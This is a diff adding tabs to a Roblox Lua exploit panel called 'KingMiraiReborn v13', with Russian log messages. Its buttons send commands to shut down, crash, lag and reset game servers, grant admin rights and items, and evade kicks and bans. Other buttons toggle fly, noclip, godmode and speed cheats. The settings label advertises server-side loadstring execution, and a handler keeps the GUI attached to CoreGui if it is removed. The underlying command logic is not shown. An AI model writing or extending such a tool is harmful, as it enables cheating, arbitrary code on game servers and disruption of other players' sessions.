+    btn.MouseButton1Click:Connect(function()
+        AddLog("Фан-команда: " .. cmd)
+        GlobalCommand(cmd, "")
+    end)
+end
+
+AddFunButton("RAINBOW", "rainbow", 0.02, 0.02)
+AddFunButton("PARTY", "party", 0.35, 0.02)
+AddFunButton("EXPLODE SELF", "explodeself", 0.68, 0.02)
+AddFunButton("TELEPORT RANDOM", "teleportrandom", 0.02, 0.14)
+AddFunButton("FLY ALL", "flyall", 0.35, 0.14)
+AddFunButton("NOGRAVITY", "nogravity", 0.68, 0.14)
+AddFunButton("KILL SELF", "killself", 0.02, 0.26)
+
+-- ================================================================
+-- TOOLS TAB
+-- ================================================================
+
+local function AddToolsButton(text, cmd, x, y)
+    local btn = Instance.new("TextButton", ToolsTab)
+    btn.Size = UDim2.new(0.3, -5, 0.1, 0)
+    btn.Position = UDim2.new(x, 5, y, 5)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(0, 0, 0)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 14
+    Instance.new("UICorner").Parent = btn
+    btn.MouseButton1Click:Connect(function()
+        AddLog("Инструмент: " .. cmd)
+        GlobalCommand(cmd, "")
+    end)
+end
+
+AddToolsButton("GIVE TOOLS", "givetools", 0.02, 0.02)
+AddToolsButton("GIVE ADMIN", "giveadmin", 0.35, 0.02)
+AddToolsButton("GIVE SWORD", "givesword", 0.68, 0.02)
+AddToolsButton("GIVE GUN", "givegun", 0.02, 0.14)
+AddToolsButton("GIVE ALL ITEMS", "giveallitems", 0.35, 0.14)
+
+-- ================================================================
+-- ADMIN TAB
+-- ================================================================
+
+local function AddAdminButton(text, cmd, x, y)
+    local btn = Instance.new("TextButton", AdminTab)
+    btn.Size = UDim2.new(0.3, -5, 0.1, 0)
+    btn.Position = UDim2.new(x, 5, y, 5)
+    btn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 14
+    Instance.new("UICorner").Parent = btn
+    btn.MouseButton1Click:Connect(function()
+        AddLog("Админ-команда: " .. cmd)
+        GlobalCommand(cmd, "")
+    end)
+end
+
+AddAdminButton("SHUTDOWN", "shutdown", 0.02, 0.02)
+AddAdminButton("CRASH", "crash", 0.35, 0.02)
+AddAdminButton("LAG", "lag", 0.68, 0.02)
+AddAdminButton("RESET SERVER", "resetserver", 0.02, 0.14)
+AddAdminButton("LOG ALL", "logall", 0.35, 0.14)
+
+-- ================================================================
+-- ANTI TAB
+-- ================================================================
+
+local function AddAntiButton(text, cmd, x, y)
+    local btn = Instance.new("TextButton", AntiTab)
+    btn.Size = UDim2.new(0.3, -5, 0.1, 0)
+    btn.Position = UDim2.new(x, 5, y, 5)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 14
+    Instance.new("UICorner").Parent = btn
+    btn.MouseButton1Click:Connect(function()
+        AddLog("Защита: " .. cmd)
+        GlobalCommand(cmd, "")
+    end)
+end
+
+AddAntiButton("ANTI-KICK", "antikick", 0.02, 0.02)
+AddAntiButton("ANTI-BAN", "antiban", 0.35, 0.02)
+AddAntiButton("ANTI-CRASH", "anticrash", 0.68, 0.02)
+AddAntiButton("ANTI-TP", "antitp", 0.02, 0.14)
+
+-- ================================================================
+-- FLY TAB
+-- ================================================================
+
+local function AddFlyButton(text, speed, x, y)
+    local btn = Instance.new("TextButton", FlyTab)
+    btn.Size = UDim2.new(0.3, -5, 0.1, 0)
+    btn.Position = UDim2.new(x, 5, y, 5)
+    btn.BackgroundColor3 = Color3.fromRGB(50, 100, 255)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 14
+    Instance.new("UICorner").Parent = btn
+    btn.MouseButton1Click:Connect(function()
+        AddLog("Полёт: " .. speed)
+        GlobalCommand("flyspeed", tostring(speed))
+    end)
+end
+
+AddFlyButton("FLY OFF", "0", 0.02, 0.02)
+AddFlyButton("FLY SLOW", "20", 0.35, 0.02)
+AddFlyButton("FLY MEDIUM", "50", 0.68, 0.02)
+AddFlyButton("FLY FAST", "100", 0.02, 0.14)
+AddFlyButton("FLY ULTRA", "200", 0.35, 0.14)
+
+-- ================================================================
+-- NOCLIP TAB
+-- ================================================================
+
+local function AddNoclipButton(text, state, x, y)
+    local btn = Instance.new("TextButton", NoclipTab)
+    btn.Size = UDim2.new(0.3, -5, 0.1, 0)
+    btn.Position = UDim2.new(x, 5, y, 5)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(0, 0, 0)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 14
+    Instance.new("UICorner").Parent = btn
+    btn.MouseButton1Click:Connect(function()
+        AddLog("Ноклип: " .. state)
+        GlobalCommand("noclipstate", state)
+    end)
+end
+
+AddNoclipButton("NOCLIP ON", "on", 0.02, 0.02)
+AddNoclipButton("NOCLIP OFF", "off", 0.35, 0.02)
+
+-- ================================================================
+-- GODMODE TAB
+-- ================================================================
+
+local function AddGodmodeButton(text, state, x, y)
+    local btn = Instance.new("TextButton", GodmodeTab)
+    btn.Size = UDim2.new(0.3, -5, 0.1, 0)
+    btn.Position = UDim2.new(x, 5, y, 5)
+    btn.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(0, 0, 0)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 14
+    Instance.new("UICorner").Parent = btn
+    btn.MouseButton1Click:Connect(function()
+        AddLog("Бог-режим: " .. state)
+        GlobalCommand("godmodestate", state)
+    end)
+end
+
+AddGodmodeButton("GODMODE ON", "on", 0.02, 0.02)
+AddGodmodeButton("GODMODE OFF", "off", 0.35, 0.02)
+
+-- ================================================================
+-- SPEED TAB
+-- ================================================================
+
+local function AddSpeedButton(text, speed, x, y)
+    local btn = Instance.new("TextButton", SpeedTab)
+    btn.Size = UDim2.new(0.3, -5, 0.1, 0)
+    btn.Position = UDim2.new(x, 5, y, 5)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(0, 0, 0)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 14
+    Instance.new("UICorner").Parent = btn
+    btn.MouseButton1Click:Connect(function()
+        AddLog("Скорость: " .. speed)
+        GlobalCommand("speedset", tostring(speed))
+    end)
+end
+
+AddSpeedButton("SPEED 0", "0", 0.02, 0.02)
+AddSpeedButton("SPEED 16", "16", 0.35, 0.02)
+AddSpeedButton("SPEED 30", "30", 0.68, 0.02)
+AddSpeedButton("SPEED 50", "50", 0.02, 0.14)
+AddSpeedButton("SPEED 100", "100", 0.35, 0.14)
+AddSpeedButton("SPEED 200", "200", 0.68, 0.14)
+
+-- ================================================================
+-- SETTINGS TAB
+-- ================================================================
+
+local InfoLabel = Instance.new("TextLabel", SettingsTab)
+InfoLabel.Size = UDim2.new(1, -20, 0.45, 0)
+InfoLabel.Position = UDim2.new(0, 10, 0, 10)
+InfoLabel.BackgroundTransparency = 1
+InfoLabel.Text = [[KingMiraiReborn v13 — MOBILE EDITION
+
+🟢 GUI адаптирован под телефон
+🟢 Все команды глобальные
+🟢 15 вкладок с функциями
+🟢 Логирование всех действий
+🟢 Поддержка loadstring на сервере
+
+Команды для консоли:
+  GlobalExecute("code")
+  GlobalBroadcast("msg")
+  GlobalChat("msg")
+
+by @KingMirai | DIMSTAT EDITION]]
+InfoLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
+InfoLabel.TextScaled = false
+InfoLabel.TextSize = 14
+InfoLabel.TextWrapped = true
+InfoLabel.Font = Enum.Font.Code
+InfoLabel.LineHeight = 1.3
+InfoLabel.TextXAlignment = Enum.TextXAlignment.Left
+InfoLabel.TextYAlignment = Enum.TextYAlignment.Top
+
+local ReloadBtn = Instance.new("TextButton", SettingsTab)
+ReloadBtn.Size = UDim2.new(0.4, -10, 0.08, 0)
+ReloadBtn.Position = UDim2.new(0.3, 5, 0.6, 5)
+ReloadBtn.BackgroundColor3 = Color3.fromRGB(50, 100, 255)
+ReloadBtn.Text = "RELOAD GUI"
+ReloadBtn.TextColor3 = Color3.new(1, 1, 1)
+ReloadBtn.Font = Enum.Font.Code
+ReloadBtn.TextSize = 16
+Instance.new("UICorner").Parent = ReloadBtn
+ReloadBtn.MouseButton1Click:Connect(function()
+    AddLog("Перезагрузка GUI")
+    ScreenGui:Destroy()
+    task.wait(0.5)
+    _G.RestartKingMirai = true
+end)
+
+local ClearLogsBtn = Instance.new("TextButton", SettingsTab)
+ClearLogsBtn.Size = UDim2.new(0.4, -10, 0.08, 0)
+ClearLogsBtn.Position = UDim2.new(0.3, 5, 0.72, 5)
+ClearLogsBtn.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+ClearLogsBtn.Text = "CLEAR LOGS"
+ClearLogsBtn.TextColor3 = Color3.new(0, 0, 0)
+ClearLogsBtn.Font = Enum.Font.Code
+ClearLogsBtn.TextSize = 16
+Instance.new("UICorner").Parent = ClearLogsBtn
+ClearLogsBtn.MouseButton1Click:Connect(function()
+    Logs = {}
+    AddLog("Логи очищены")
+end)
+
+-- ================================================================
+-- ЗАЩИТА GUI
+-- ================================================================
+
+ScreenGui.AncestryChanged:Connect(function()
+    if not ScreenGui.Parent then
+        task.wait(0.5)
+        ScreenGui.Parent = CoreGui
+    end
+end)
+
+-- ================================================================
+-- ЗАПУСК
+-- ================================================================
+
+Main.Visible = true
+OpenBtn.Visible = false
+AddLog("MOBILE EDITION загружена! 15 вкладок, адаптировано под телефон.")
+
+print("[KingMiraiReborn v13] MOBILE EDITION ЗАГРУЖЕНА!")
+print("[KingMiraiReborn v13] GUI адаптирован под телефон, все функции сохранены.")
